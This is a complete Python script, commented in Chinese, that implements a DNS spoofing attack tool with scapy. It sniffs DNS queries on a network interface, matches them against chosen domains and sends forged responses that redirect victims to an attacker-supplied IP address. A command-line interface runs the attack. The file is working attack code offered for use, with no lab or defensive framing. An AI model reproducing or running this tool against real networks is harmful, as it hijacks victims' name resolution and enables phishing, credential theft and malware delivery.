#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DNS欺骗攻击工具
劫持DNS查询，返回虚假IP地址
"""

from scapy.all import *

class DNSSpoof:
    def __init__(self):
        self.running = False
        self.spoof_domains = {}
        self.fake_ip = ""
        
    def setup_spoof_rules(self, domains, fake_ip):
        """设置欺骗规则"""
        self.fake_ip = fake_ip
        for domain in domains:
            self.spoof_domains[domain.lower()] = fake_ip
        print(f"[*] 设置DNS欺骗规则:")
        for domain, ip in self.spoof_domains.items():
            print(f"    - {domain} -> {ip}")
    
    def dns_handler(self, packet):
        """DNS包处理函数"""
        if not self.running:
            return
            
        if packet.haslayer(DNSQR):  # DNS查询包
            dns = packet[DNS]
            query_name = dns.qd.qname.decode('utf-8').rstrip('.')
            
            # 检查是否匹配欺骗规则
            for domain, fake_ip in self.spoof_domains.items():
                if domain in query_name.lower():
                    print(f"[*] 劫持DNS查询: {query_name} -> {fake_ip}")
                    
                    # 构造虚假DNS响应
                    spoofed_pkt = (
                        IP(dst=packet[IP].src, src=packet[IP].dst) /
                        UDP(dport=packet[UDP].sport, sport=53) /
                        DNS(
                            id=dns.id,
                            qr=1,  # 响应标志
                            aa=0,
                            rcode=0,
                            qd=dns.qd,
                            an=DNSRR(
                                rrname=dns.qd.qname,
                                ttl=600,
                                rdata=fake_ip
                            )
                        )
                    )
                    
                    # 发送虚假响应
                    send(spoofed_pkt, verbose=0)
                    return "欺骗包已发送"
        
        return None
    
    def start_attack(self, interface):
        """启动攻击"""
        self.running = True
        print(f"[*] 启动DNS欺骗攻击，监听接口: {interface}")
        
        # 设置过滤器，只监听DNS流量
        filter_str = "udp port 53"
        
        try:
            sniff(iface=interface, filter=filter_str, prn=self.dns_handler, store=0)
        except Exception as e:
            print(f"[!] DNS欺骗错误: {e}")
    
    def stop_attack(self):
        """停止攻击"""
        print("[*] 停止DNS欺骗攻击")
        self.running = False
        print("[+] 攻击已停止")

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='DNS欺骗攻击工具')
    parser.add_argument('-i', '--interface', required=True, help='网络接口')
    parser.add_argument('-d', '--domains', nargs='+', required=True, help='要欺骗的域名列表')
    parser.add_argument('-f', '--fake-ip', required=True, help='虚假IP地址')
    
    args = parser.parse_args()
    
    tool = DNSSpoof()
    tool.setup_spoof_rules(args.domains, args.fake_ip)
    
    try:
        tool.start_attack(args.interface)
    except KeyboardInterrupt:
        tool.stop_attack()